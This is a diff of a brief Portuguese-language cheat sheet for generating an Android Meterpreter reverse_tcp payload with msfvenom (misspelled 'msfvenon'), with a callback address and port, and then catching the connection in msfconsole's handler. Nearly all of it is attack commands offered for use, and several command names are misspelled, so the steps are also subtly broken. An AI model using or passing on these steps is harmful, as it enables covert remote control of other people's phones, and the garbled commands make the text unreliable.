@@ -1,4 +1,4 @@
-MSFVENON
+oMSFVENON
 
 PAYLOAD = android/meterpreter/reverse_tcp 
 
@@ -14,8 +14,8 @@ msfvenon -p android/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 R > arq
 Abrir msfconsole
 msfconsole
 
-usar o multhandler, para fazer o exploit
-use multhandler
+usar o exploit/mult/handler, para fazer o exploit
+use exploit/mult/handler
 
 Setar as informações e payloads:
 set payload android/meterpreter/reverse_tcp
